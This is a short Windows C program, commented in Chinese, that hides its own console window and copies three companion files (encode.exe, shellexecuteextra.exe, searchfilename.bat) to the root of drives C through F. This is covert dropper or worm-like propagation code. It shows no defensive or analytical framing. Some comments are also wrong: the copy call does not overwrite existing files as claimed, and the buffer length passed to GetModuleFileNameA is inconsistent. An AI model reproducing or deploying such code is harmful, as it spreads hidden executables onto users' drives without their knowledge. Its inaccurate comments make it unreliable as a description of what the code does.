#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "Windows.h"  

void copy(char name[MAX_PATH]){
	char ch;
	char szPath[MAX_PATH];          //保存自身文件名的字符串
	char toPath[MAX_PATH] = "C:\\";        //要复制到的路径字符串
	
	
	
	int i;
	GetModuleFileNameA(NULL, (LPCH)szPath, 225);     //获取自身路径的函数 
	 
	for (i = strlen(szPath); i > 0; i--)      //获取文件名的处理
	{
		if (szPath[i] == '\\')         //最后一个‘\’后面就是文件名
			break;
	}
	strcpy(&szPath[i],name);
	//strcat(szPath, '\\0');
	strcat(toPath, &szPath[i]);         //把文件名连接到toPath，得到“C:\*.exe”
	for (ch = 'c'; ch <= 'f'; ch++)      //复制处理，从c到f
	{
		toPath[0] = ch;                //改盘符   
		CopyFileA(szPath, toPath, 1);       //复制函数，从szPath复制到toPath，强行覆盖原有文件
	}
	printf("%s",szPath);
	
}
int main (int argc,TCHAR* argv[]){
	ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
	copy("\\encode.exe");
	copy("\\shellexecuteextra.exe");
	copy("\\searchfilename.bat");
	return 0;
	}
